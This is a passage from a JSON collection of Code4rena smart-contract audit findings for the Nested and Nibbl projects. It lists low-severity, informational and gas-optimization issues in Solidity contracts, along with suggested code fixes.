mismatches between on-chain and off-chain states.  **Recommendation**: This may hinder detecting discrepancies between on-chain and off-chain states leading to flawed assumptions of on-chain state and protocol behavior.   ## `receive()` Function Should Emit An Event **Severity**: Low **Context**: [`NestedFactory.sol#L88-L92`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/NestedFactory.sol#L88-L92), [`Withdrawer.sol#L16-L18`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/Withdrawer.sol#L16-L18)  **Description**: Consider emitting an event inside this function with `msg.sender` and `msg.value` as the parameters. This would make it easier to track incoming ether transfers.  **Recommendation**: Add events to the `receive()` functions.    ## Lack of Event Emission For Critical Functions **Severity**: Low **Context**: [`BeefyVaultOperator.sol#L36-L67`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/operators/Beefy/BeefyVaultOperator.sol#L36-L67), [`BeefyVaultOperator.sol#L79-L108`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/operators/Beefy/BeefyVaultOperator.sol#L79-L108), [`BeefyZapBiswapLPVaultOperator.sol#L46-L77`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L46-L77), [`BeefyZapBiswapLPVaultOperator.sol#L91-L121`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L91-L121), [`BeefyZapUniswapLPVaultOperator.sol#L46-L77`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L46-L77), [`BeefyZapUniswapLPVaultOperator.sol#L91-L121`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L91-L121), [`ParaswapOperator.sol#L22-L48`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/operators/Paraswap/ParaswapOperator.sol#L22-L48)  **Description**: Several functions update critical parameters that are missing event emission. These should be performed to ensure tracking of changes of such critical parameters.  **Recommendation**: Add events to functions that change critical parameters.   ## Unindexed Event Parameters **Severity** Informational **Context**: [`MixinOperatorResolver.sol#L14`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/abstracts/MixinOperatorResolver.sol#L14), [`TimelockControllerEmergency.sol#L60`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/governance/TimelockControllerEmergency.sol#L60)  **Description**: Parameters of certain events are expected to be indexed so that they\u2019re included in the block\u2019s bloom filter for faster access. Failure to do so might confuse off-chain tooling looking for such indexed events.  **Recommendation**: Add the indexed keyword to event parameters that should include it.   ## Lack of `solhint` To Ignore Warnings **Severity**: Informational **Context**: [`OwnerProxy.sol#L21-L36`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/governance/OwnerProxy.sol#L21-L36), [`OperatorScripts.sol#L58-L60`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/governance/scripts/OperatorScripts.sol#L58-L60)  **Description**: `solhint` is useful to help ignore warnings that aren't really issues. For example the code base has some assembly blocks which promts the warning `Linter: Avoid to use inline assembly. It is acceptable only in rare cases`. Adding in `/* solhint-disable no-inline-assembly */` above it will ignore this warning.  **Recommendation**: Use `solhint` to ignore warnings that aren't really issues.   ## Spelling Errors **Severity**: Informational **Context**: [`NestedFactory.sol#L51 (withdrawed => withdrawn)`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/NestedFactory.sol#L51), [`NestedFactory.sol#L477 (dont => do not)`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/NestedFactory.sol#L477), [`NestedFactory.sol#L534 (transfered => transferred)`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/NestedFactory.sol#L534), [`NestedFactory.sol#L639 (withdrawed => withdrawal)`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/NestedFactory.sol#L639), [`MixinOperatorResolver.sol#L81 (datas => data(it is already plural))`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/abstracts/MixinOperatorResolver.sol#L81), [`OwnableProxyDelegation.sol#L17 (setted => set)`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/abstracts/OwnableProxyDelegation.sol#L17), [`TimeLockControllerEmergency.sol#L183 (datas => data)`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/governance/TimelockControllerEmergency.sol#L183), [`TimeLockControllerEmergency.sol#L187 (datas => data)`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/governance/TimelockControllerEmergency.sol#L187), [`TimeLockControllerEmergency.sol#L224 (datas => data)`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/governance/TimelockControllerEmergency.sol#L224), [`TimeLockControllerEmergency.sol#L230 (datas => data)`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/governance/TimelockControllerEmergency.sol#L230), [`TimeLockControllerEmergency.sol#L232 (datas => data)`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/governance/TimelockControllerEmergency.sol#L232), [`BeefyVaultOperator.sol#L95 (WITHDRAWED => WITHDRAWAL)`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/operators/Beefy/BeefyVaultOperator.sol#L95), [`BeefyZapBiswapLPVaultOperator.sol#L108 (WITHDRAWED => WITHDRAWAL)`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/operators/Beefy/lp/BeefyZapBiswapLPVaultOperator.sol#L108), [`BeefyZapUniswapLPVaultOperator.sol#L108 (WITHDRAWED => WITHDRAWAL)`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/operators/Beefy/lp/BeefyZapUniswapLPVaultOperator.sol#L108), [`StakingLPVaultHelpers.sol#L21 (liquitiy => liquidity)`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/libraries/StakingLPVaultHelpers.sol#L21), [`StakingLPVaultHelpers.sol#L52 (liquitiy => liquidity)`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/libraries/StakingLPVaultHelpers.sol#L52), [`StakingLPVaultHelpers.sol#L85 (liquitiy => liquidity)`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/libraries/StakingLPVaultHelpers.sol#L85), [`StakingLPVaultHelpers.sol#L115 (liquitiy => liquidity)`](https://github.com/code-423n4/2022-06-nested/blob/main/contracts/libraries/StakingLPVaultHelpers.sol#L115)  **Description**: Spelling errors in comments can cause confusion to both users and developers.  **Recommendation**: Check all misspellings to ensure they are corrected.   ## Missing or Incomplete NatSpec **Severity**: Informational **Context**: [`All Contracts`](https://github.com/code-423n4/2022-06-nested)  **Description**: Some functions are missing @notice/@dev NatSpec comments for the function, @param for all/some of their parameters and @return for return values. Given that NatSpec is an important part of code documentation, this affects code comprehension, auditability and usability.  **Recommendation**: Add in full NatSpec comments for all functions to have complete code documentation for future use.   ## Too Recent of a Pragma **Severity** Informational **Context**: [`All Contracts`](https://github.com/code-423n4/2022-06-nested)  **Description**: Using too recent of a pragma is risky since they are not battle tested. A rise of a bug that wasn't known on release would cause either a hack or a need to secure funds and redeploy.  **Recommendation**:  Use a Pragma version that has been used for sometime. I would suggest `0.8.4` for the decrease of risk and still has the gas optimizations implemented."}, {"title": "Basket NFT have no name and symbol", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/317", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L13 https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/Basket.sol#L6   # Vulnerability details  ## Impact The `Basket` contract is intended to be used behind a proxy. But the `ERC721` implementation used is not upgradeable, and its constructor is called at deployment time on the implementation. So all proxies will have a void name and symbol, breaking all potential integrations and listings.  ## Proof of Concept `ERC721(\"NFT Basket\", \"NFTB\")` is called at deployment time, and sets private variable at the implementation level. Therefore when loading the code during `delegateCall`, these variables will not be initialized.  ## Recommended Mitigation Steps The easiest mitigation would be to pass this variable as immutable so they are hardcoded in the implementation byte code.  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/282", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "## GAS  1. ## Title: Caching _tokens[i] can save gas  Occurrences: https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Basket.sol#L71-L73 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Basket.sol#L44-L45   Instead of calling array value by assign its key every call, we can cache it for gas saving Change to: ```         for (uint256 i = 0; i < _tokens.length; i++) {      address _token = _tokens[i];      uint _tokenId = _tokenIds[i]             uint256 _balance = IERC1155(_token).balanceOf(address(this),  _tokenId);             IERC1155(_token).safeTransferFrom(address(this), _to, _tokenId, _balance, \"0\");             emit WithdrawERC1155(_token, _tokenId, _balance, _to);         } ``` By doing this way we can save 48 gas per call   2. ## Title: Prefix increment and unchecked for `i`  Occurrences: https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Basket.sol#L43 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Basket.sol#L70 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Basket.sol#L93  Best practice for doing increment is using prefix increment and unchecked for `i` var inside for():  Change to: ```         for (uint256 i = 0; i < _tokens.length;) {             IERC721(_tokens[i]).safeTransferFrom(address(this), _to, _tokenId[i]);             emit WithdrawERC721(_tokens[i], _tokenId[i], _to);      unchecked{++i;}         } ```   3. ## Title: Using calldata to store argument variable:  Occurrences: https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Basket.sol#L41 https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/Basket.sol#L68  We can store `_tokens` and `_tokenIds` read only parameter with calldata instead of using memory.  ## Recommended mitigation step Change to: ```     function withdrawMultipleERC721(address[] calldata _tokens, uint256[] calldata _tokenId, address _to) external override { ```   4. ## Title: Using < operator instead of <=  https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L147  By using < operator to validate we can save 3 gas per call. The 1 second difference can be ignore   5. ## Title: Using delete statement to set to default value  https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L477  Using delete statement to set value to 0 can save 8 gas per execution  ## Recommended mitigation step ``` delete feeAccruedCurator; ```  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/255", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "# QA Report  ## [L-01] Lack of ownership transfer pattern Setting the curator to the wrong address will result in permanent loss of functionality in the protocol. It is recommended to apply a two-step transfer.  https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L485-L488  ## [L-02] Unnecessary safeTransferFrom() when sending from address(this) `safeTransfer()` can be used instead when sending from the current address.  https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L495-L509  ## [L-03] Missing zero address check Contract would need to be redeployed if the `feeTo` variable is accidently set to address(0).  https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVaultFactory.sol#L25  ## [L-04] Unsafe transfer, use safeTransfer() It is recommended to use safeTransfer() instead of transfer() to mitigate against ERC20 implementations that do not revert on failure.  https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L517  ## [N-01] Constants should be all caps Most constants defined in the contracts are fully capitalized, just this one example is not.  https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L28  ## [N-02] CURVE_FEE is described as a variable when it is a constant https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L210"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/252", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "## Minus before addition  https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L401  ``` _buyoutBid = msg.value + (primaryReserveBalance - fictitiousPrimaryReserveBalance) + secondaryReserveBalance; ```  This line perform minus before addition which risk underflow. Should add before minus in all case. Change code to this  ``` _buyoutBid = msg.value + primaryReserveBalance + secondaryReserveBalance - fictitiousPrimaryReserveBalance; ```  This add before minus, so never underflow.  ## Use \"\" for data instead of \"0\"  \"0\" is not 0x \"\" is 0x  Sending empty data should send \"\" not \"0\"  https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L538  https://github.com/code-423n4/2022-06-nibbl/blob/8c3dbd6adf350f35c58b31723d42117765644110/contracts/NibblVault.sol#L549  ``` IERC1155(_asset).safeTransferFrom(address(this), _to, _assetID, balance, \"0\"); ```  should be  ``` IERC1155(_asset).safeTransferFrom(address(this), _to, _assetID, balance, \"\"); ```"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/242", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "# check the wrong arggument   In this section the function check the amout of the `_adminFeeAmt` and its more correct to check the `_feeAdmin` amount because there is a case that the `_feeAdmin` will be 0 but the `_adminFeeAmt` will be greater than 0.  ``` if(_adminFeeAmt > 0) {             safeTransferETH(_factory, _feeAdmin); //Transfers admin fee to the factory contract         } ```   ``` fix -  if(_feeAdmin > 0) {             safeTransferETH(_factory, _feeAdmin); //Transfers admin fee to the factory contract         } ```"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/215", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "# FINDINGS FOR NIBBL CONTEST **Commit:** `N/A` **Type of Audit:** Security Review **Type of Project:** NFT Fractionalization Protocol **Language**: Solidity **Methods**: Manual review ## Audit Scope  --- ## 1.  Contract `NibblVault.sol`   ### [LOW] Missing event emission for state-changing function `updateCurator` function  **File**: [L485](https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVault.sol#L485-L488)  **Description**: State-changing function, `_updateCurator` function does not emit an appropriate event.  ```= solidity function updateCurator(address _newCurator) external override {     require(msg.sender == curator,\"NibblVault: Only Curator\");     curator = _newCurator; }  ``` **Recommendation**: Consider creating and emitting appropriate event for `_updateCurator` function   --- ## 2.  Contract `NibblVaultFactory.sol`  ### [LOW] Unused Openzeppelin's `SafeMath` Library  **File**: [L9](https://github.com/code-423n4/2022-06-nibbl/blob/main/contracts/NibblVaultFactory.sol#L9)  **Description**: Whereas Openzeppelin's `SafeMath` Library is imported, it is never used in the contract ``` = solidity import { SafeMath } from  \"@openzeppelin/contracts/utils/math/SafeMath.sol\";  ```  **Recommendation**: Consider utilizing the imported Openzeppelin's `SafeMath` library for efficiency in all logic involving arithmetic operations or consider removing this library if it will be used in the contract.   ---    ### [LOW] Missing access control and possibility of reentrancy attack  **File**: [L112](https://github.com/NibblNFT/nibbl-smartcontracts/blob/master/contracts/NibblVaultFactory.sol#L112)  **Description**: No access control logic to restrict calls to  `withdrawAdminFee(...)` function and missing reentrancy guard to mitigate the risks of reentrancy. The code is shown below:  ```solidity= function withdrawAdminFee() external override {     (bool _success, ) = payable(feeTo).call{value: address(this).balance}(\"\");     require(_success); } ```  **Recommendation**: Consider adding  access control to restrict calls to `withdrawAdminFee(...)` function and consider implementing reentrancy guard to mitigate the risks of reentrancy.  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-nibbl-findings/issues/204", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-06-nibbl-findings", "body": "[G-01] Constant Value of a Call to keccak256() should Use Immutable  When using constant it is expected that the value should be converted into a constant value at compile time. However when using a call to keccak256(), the expression is re-calculated each time the constant is referenced. Resulting in costing about 100 gas more on each access to this \"constant\". link for more details: https://github.com/ethereum/solidity/issues/9232  Issue found at ``` ./EIP712Base.sol:7-10:    bytes32 internal constant EIP712_DOMAIN_TYPEHASH = keccak256(bytes(\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\")); ./NibblVault.sol:51:    bytes32 private constant PERMIT_TYPEHASH = keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"); ./AccessControlMechanism.sol:12:    bytes32 public constant FEE_ROLE = keccak256(\"FEE_ROLE\"); ./AccessControlMechanism.sol:13:    bytes32 public constant PAUSER_ROLE = keccak256(\"PAUSER_ROLE\"); ./AccessControlMechanism.sol:14:    bytes32 public constant IMPLEMENTER_ROLE = keccak256(\"IMPLEMENTER_ROLE\"); ```   [G-02] Unnecessary Default Value Initialization  When variable is not initialized, it will have its default values. For example, 0 for uint, false for bool and address(0) for address. link: https://docs.soliditylang.org/en/v0.8.15/control-structures.html#scoping-and-declarations  I suggest removing default value initialization for following variables. ``` ./Basket.sol:43:        for (uint256 i = 0; i < _tokens.length; i++) { ./Basket.sol:70:        for (uint256 i = 0; i < _tokens.length; i++) { ./Basket.sol:93:        for (uint256 i = 0; i < _tokens.length; i++) { ./NibblVault.sol:506:        for (uint256 i = 0; i < _assetAddresses.length; i++) { ./NibblVault.sol:525:        for (uint256 i = 0; i < _assets.length; i++) { ./NibblVault.sol:547:        for (uint256 i = 0; i < _assets.length; i++) { ```  For example these can change to: - for (uint256 i; i < _tokens.length; i++) {   [G-03] Store Array's Length as a Variable   I suggest to store an array's length as a variable before the for-loop since it can save 3 gas per iteration.  Issue found at: ``` ./Basket.sol:43:        for (uint256 i = 0; i < _tokens.length; i++) { ./Basket.sol:70:        for (uint256 i = 0; i < _tokens.length; i++) { ./Basket.sol:93:        for (uint256 i = 0; i < _tokens.length; i++) { ./NibblVault.sol:506:        for (uint256 i = 0; i < _assetAddresses.length; i++) { ./NibblVault.sol:525:        for (uint256 i = 0; i < _assets.length; i++) { ./NibblVault.sol:547:        for (uint256 i = 0; i < _assets.length; i++) { ```  For example, I suggest changing it to ``` length = _tokens.length for (uint256 i = 0; i < length; i++) { ```   [G-04] ++i Costs Less Gas than i++  It is better to use ++i than i++ when possible since it costs less gas.  Issue found at: ``` ./Basket.sol:43:        for (uint256 i = 0; i < _tokens.length; i++) { ./Basket.sol:70:        for (uint256 i = 0; i < _tokens.length; i++) { ./Basket.sol:93:        for (uint256 i = 0; i < _tokens.length; i++) { ./NibblVault.sol:506:        for (uint256 i = 0; i < _assetAddresses.length; i++) { ./NibblVault.sol:525:        for (uint256 i = 0; i < _assets.length; i++) { ./NibblVault.sol:547:        for (uint256 i = 0; i < _assets.length; i++) { ./NibblVault.sol:562:        bytes32 structHash = keccak256(abi.encode(PERMIT_TYPEHASH, owner, spender, value, nonces[owner]++, deadline)); ```   [G-05] Use Calldata instead of Memory for Read Only Function Parameters  It is cheaper gas to use calldata than memory if the function parameter is read only. Calldata is a non-modifiable, non-persistent area where function arguments are stored,  and behaves mostly like memory. More details on following link. link: https://docs.soliditylang.org/en/v0.8.15/types.html#data-location  I recommend changing following memory to calldata ``` ./EIP712Base.sol:15:    function INIT_EIP712(string memory name, string memory version) internal { ./Basket.sol:41:    function withdrawMultipleERC721(address[] memory _tokens, uint256[] memory _tokenId, address _to) external override { ./Basket.sol:68:    function withdrawMultipleERC1155(address[] memory _tokens, uint256[] memory _tokenIds, address _to) external override { ./Basket.sol:91:    function withdrawMultipleERC20(address[] memory _tokens) external override { ./Basket.sol:99:    function onERC721Received(address, address from, uint256 id, bytes memory) external override returns(bytes4) { ./Basket.sol:104:    function onERC1155Received(address, address from, uint256 id, uint256 amount, bytes memory) external virtual override returns (bytes4) { ./Basket.sol:109:    function onERC1155BatchReceived(address, address from, uint256[] memory ids, uint256[] memory amounts, bytes memory) external virtual override returns (bytes4) { ./NibblVault.sol:174:        string memory _tokenName,  ./NibblVault.sol:175:        string memory _tokenSymbol,  ./NibblVault.sol:504:    function withdrawMultipleERC721(address[] memory _assetAddresses, uint256[] memory _assetIDs, address _to) external override boughtOut { ./NibblVault.sol:523:    function withdrawMultipleERC20(address[] memory _assets, address _to) external override boughtOut { ./NibblVault.sol:545:    function withdrawMultipleERC1155(address[] memory _assets, uint256[] memory _assetIDs, address _to) external override boughtOut { ./NibblVault.sol:577:    function onERC1155Received(address, address, uint256, uint256, bytes memory) external pure returns (bytes4) { ./NibblVault.sol:581:    function onERC1155BatchReceived(address, address, uint256[] memory, uint256[] memory, bytes memory) external pure returns (bytes4) { ./NibblVaultFactory.sol:41:        string memory _name, ./NibblVaultFactory.sol:42:        string memory _symbol, ./NibblVaultFactory.sol:80:    function createBasket(address _curator, string memory _mix) public override returns(address)  { ./NibblVaultFactory.sol:88:    function getBasketAddress(address _curator, string memory _mix) public override view returns(address _basket) { ```   [G-06] Using Elements Smaller than 32 bytes (256 bits) Might Use More Gas  This is because EVM operates on 32 bytes at a time. So I recommend using uint256 instead of anything smaller. More information about this in the following link. link: https://docs.soliditylang.org/en/v0.8.15/internals/layout_in_storage.html  Issue found at ``` ./Twav.sol:6:        uint32 timestamp; ./Twav.sol:11:    uint8 public twavObservationsIndex; ./Twav.sol:12:    uint8 private constant TWAV_BLOCK_NUMBERS = 4; //TWAV of last 4 Blocks  ./Twav.sol:13:    uint32 public lastBlockTimeStamp; ./Twav.sol:21:    function _updateTWAV(uint256 _valuation, uint32 _blockTimestamp) internal { ./Twav.sol:22:        uint32 _timeElapsed;  ./Twav.sol:37:            uint8 _index = ((twavObservationsIndex + TWAV_BLOCK_NUMBERS) - 1) % TWAV_BLOCK_NUMBERS; ./NibblVault.sol:28:    uint32 private constant primaryReserveRatio = 200_000; //20% ./NibblVault.sol:57:    uint32 public secondaryReserveRatio; ./NibblVault.sol:183:        uint32 _secondaryReserveRatio = uint32((msg.value * SCALE * 1e18) / (_initialTokenSupply * _initialTokenPrice)); ./NibblVault.sol:303:            uint32 _blockTimestamp = uint32(block.timestamp % 2**32); ./NibblVault.sol:365:            uint32 _blockTimestamp = uint32(block.timestamp % 2**32); ./NibblVault.sol:445:        uint32 _blockTimestamp = uint32(block.timestamp % 2**32); ./NibblVault.sol:557:        uint8 v, ```   [G-07] Use require instead of &&  When there are multiple conditions in require statement, break down the require statement into multiple require statements instead of using && can save gas.  Issue found at ``` ./NibblVaultFactory.sol:107:        require(basketUpdateTime != 0 && block.timestamp >= basketUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\"); ./NibblVaultFactory.sol:131:        require(feeToUpdateTime != 0 && block.timestamp >= feeToUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\"); ./NibblVaultFactory.sol:149:        require(feeAdminUpdateTime != 0 && block.timestamp >= feeAdminUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\"); ./NibblVaultFactory.sol:166:        require(vaultUpdateTime != 0 && block.timestamp >= vaultUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\"); ```  For example these can be changed to ``` require(basketUpdateTime != 0); require(block.timestamp >= basketUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\"); ```   [G-08] Reduce the Long Revert Strings of Error Messages  By keeping the revert strings within 32 bytes will save you gas since each slot is 32 bytes.  Following are revert strings that are more than 32 bytes. ``` ./NibblVaultFactory.sol:48:        require(msg.value >= MIN_INITIAL_RESERVE_BALANCE, \"NibblVaultFactory: Initial reserve balance too low\"); ./NibblVaultFactory.sol:49:        require(IERC721(_assetAddress).ownerOf(_assetTokenID) == msg.sender, \"NibblVaultFactory: Invalid sender\"); ./NibblVaultFactory.sol:107:        require(basketUpdateTime != 0 && block.timestamp >= basketUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\"); ./NibblVaultFactory.sol:131:        require(feeToUpdateTime != 0 && block.timestamp >= feeToUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\"); ./NibblVaultFactory.sol:141:        require(_newFee <= MAX_ADMIN_FEE, \"NibblVaultFactory: Fee value greater than MAX_ADMIN_FEE\"); ./NibblVaultFactory.sol:149:        require(feeAdminUpdateTime != 0 && block.timestamp >= feeAdminUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\"); ./NibblVaultFactory.sol:166:        require(vaultUpdateTime != 0 && block.timestamp >= vaultUpdateTime, \"NibblVaultFactory: UPDATE_TIME has not passed\"); ```   [G-09] Duplicate require() Checks Should be a Modifier or a Function  Since below require checks are used more than once, I recommend making these to a modifier or a function. ``` ./Basket.sol:36:        require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\"); ./Basket.sol:42:        require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\"); ./Basket.sol:53:        require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\"); ./Basket.sol:62:        require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\"); ./Basket.sol:69:        require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\"); ./Basket.sol:79:        require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\"); ./Basket.sol:86:        require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\"); ./Basket.sol:92:        require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\"); ``` ``` ./NibblVault.sol:475:        require(msg.sender == curator,\"NibblVault: Only Curator\"); ./NibblVault.sol:486:        require(msg.sender == curator,\"NibblVault: Only Curator\"); ``` ``` ./NibblVault.sol:496:        require(msg.sender == bidder,\"NibblVault: Only winner\"); ./NibblVault.sol:505:        require(msg.sender == bidder,\"NibblVault: Only winner\"); ./NibblVault.sol:516:        require(msg.sender == bidder, \"NibblVault: Only winner\"); ./NibblVault.sol:524:        require(msg.sender == bidder, \"NibblVault: Only winner\"); ./NibblVault.sol:536:        require(msg.sender == bidder, \"NibblVault: Only winner\"); ./NibblVault.sol:546:        require(msg.sender == bidder, \"NibblVault: Only winner\"); ```   [G-10] Use Custom Errors to Save Gas  Custom errors from Solidity 0.8.4 are cheaper than revert strings. Details are explained here: https://blog.soliditylang.org/2021/04/21/custom-errors/  I recommend using custom errors. ``` ./Basket.sol:36:        require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\"); ./Basket.sol:42:        require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\"); ./Basket.sol:53:        require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\"); ./Basket.sol:62:        require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\"); ./Basket.sol:69:        require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\"); ./Basket.sol:79:        require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\"); ./Basket.sol:86:        require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\"); ./Basket.sol:92:        require(_isApprovedOrOwner(msg.sender, 0), \"withdraw:not allowed\"); ./NibblVault.sol:129:        require(unlocked == 1, 'NibblVault: LOCKED'); ./NibblVault.sol:139:        require(buyoutEndTime > block.timestamp || buyoutEndTime == 0,'NibblVault: Bought Out'); ./NibblVault.sol:146:        require(status == Status.buyout, \"NibblVault: status != buyout\"); ./NibblVault.sol:147:        require(buyoutEndTime <= block.timestamp, \"NibblVault: buyoutEndTime <= now\"); ./NibblVault.sol:154:        require(!NibblVaultFactory(factory).paused(), 'NibblVault: Paused'); ./NibblVault.sol:184:        require(_secondaryReserveRatio <= primaryReserveRatio, \"NibblVault: Excess initial funds\"); ./NibblVault.sol:185:        require(_secondaryReserveRatio >= MIN_SECONDARY_RESERVE_RATIO, \"NibblVault: secResRatio too low\"); ./NibblVault.sol:325:        require(_minAmtOut <= _purchaseReturn, \"NibblVault: Return too low\"); ./NibblVault.sol:351:        require(_secondaryReserveBalance - _saleReturn >= MIN_SECONDARY_RESERVE_BALANCE, \"NibblVault: Excess sell\"); ./NibblVault.sol:387:        require(_saleReturn >= _minAmtOut, \"NibblVault: Return too low\"); ./NibblVault.sol:399:        require(block.timestamp >= minBuyoutTime, \"NibblVault: minBuyoutTime < now\"); ./NibblVault.sol:400:        require(status == Status.initialized, \"NibblVault: Status!=initialized\"); ./NibblVault.sol:404:        require(_buyoutBid >= _currentValuation, \"NibblVault: Bid too low\"); ./NibblVault.sol:444:        require(status == Status.buyout, \"NibblVault: Status!=Buyout\"); ./NibblVault.sol:475:        require(msg.sender == curator,\"NibblVault: Only Curator\"); ./NibblVault.sol:486:        require(msg.sender == curator,\"NibblVault: Only Curator\"); ./NibblVault.sol:496:        require(msg.sender == bidder,\"NibblVault: Only winner\"); ./NibblVault.sol:505:        require(msg.sender == bidder,\"NibblVault: Only winner\"); ./NibblVault.sol:516:        require(msg.sender == bidder, \"NibblVault: Only winner\"); ./NibblVault.sol:524:        require(msg.sender == bidder, \"NibblVault: Only winner\"); ./NibblVault.sol:536:        require(msg.sender == bidder, \"NibblVault: Only winner\"); ./NibblVault.sol:546:        require(msg.sender == bidder, \"NibblVault: Only winner\"); ./NibblVault.sol:561:        require(block.timestamp <= deadline, \"NibblVault: expired deadline\"); ./NibblVault.sol:564:        require(signer == owner, \"NibblVault: invalid signature\"); ./NibblVault.sol:570:        require(success, \"NibblVault: ETH transfer failed\"); ./NibblVaultFactory.sol:48:        require(msg.value >= MIN_INITIAL_RESERVE_BALANCE, \"NibblVaultFactory: Initial reserve balance too low\"); ./NibblVaultFactory.sol:49:        require(IERC721(_assetAddress).ownerOf(_assetTokenID) == msg.sender, \"NibblVaultFactory: Invalid sender\"); 